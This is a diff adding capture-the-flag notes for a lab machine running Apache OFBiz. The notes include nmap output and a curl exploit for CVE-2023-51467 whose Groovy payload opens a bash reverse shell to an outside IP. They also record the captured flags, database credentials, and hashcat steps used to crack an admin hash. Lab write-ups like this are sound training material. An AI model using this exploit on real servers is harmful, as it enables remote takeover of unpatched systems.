@@ -1,0 +1,58 @@
+IP: 10.10.11.252
+Host is up (0.20s latency).
+Not shown: 993 closed tcp ports (reset)
+PORT      STATE    SERVICE         VERSION
+22/tcp    open     ssh             OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp    open     http            nginx 1.18.0
+|_http-title: Did not follow redirect to https://bizness.htb/
+|_http-server-header: nginx/1.18.0
+443/tcp   open     ssl/http        nginx 1.18.0
+| tls-alpn:
+|_  http/1.1
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+| Not valid before: 2023-12-14T20:03:40
+|_Not valid after:  2328-11-10T20:03:40
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: nginx/1.18.0
+| tls-nextprotoneg:
+|_  http/1.1
+|_http-title: Did not follow redirect to https://bizness.htb/
+666/tcp   filtered doom
+1088/tcp  filtered cplscrambler-al
+2525/tcp  filtered ms-v-worlds
+10003/tcp filtered documentum_s
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Webapp is running Apache OFBIZ@18.12 -> which is vulnerable to CVE-2023-51467
+
+A number of exploits exist for this (none of this worked with me) but I used the following exploit:
+curl -kv -H "Host: bizness.htb:443" \
+-d "groovyProgram=x=new String[3];x[0]='bash';x[1]='-c';x[2]='bash -i >%26 /dev/tcp/10.10.14.231/9001 0>%261;';x.execute();" \
+"https://10.10.11.252/webtools/control/ProgramExport/?requirePasswordChange=Y&PASSWORD=lobster&USERNAME=albino"
+
+
+Flags
+user: 7051deeaddc2f2d001b3255704a06813
+root: dde8caf1e4c4c43cf631c179f4a5b10c
+
+
+Checking Apache OFBIZ guide - https://gist.github.com/bagasme/1de1908c86303c83b7bd51d50a12e041 to understand how the DB is setup.
+
+It uses Apache Derby DB
+database - jdbc:derby:ofbiz
+user - ofbiz
+password - derby-ofbiz
+
+Found admin password in derby DB
+$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I (monkeybizness)
+
+Cracked it using CyberChef + hashcat
+On CyberChef:
+From Base64(uP0_QaVBpDWFeo8-dRzDqRwXQ2I - URLSafe) + To Hex (None) = b8fd3f41a541a435857a8f3e751cc3a91c174362
+
+hashcat -a 0 -m 120 b8fd3f41a541a435857a8f3e751cc3a91c174362:d (in-file) rockyou.txt
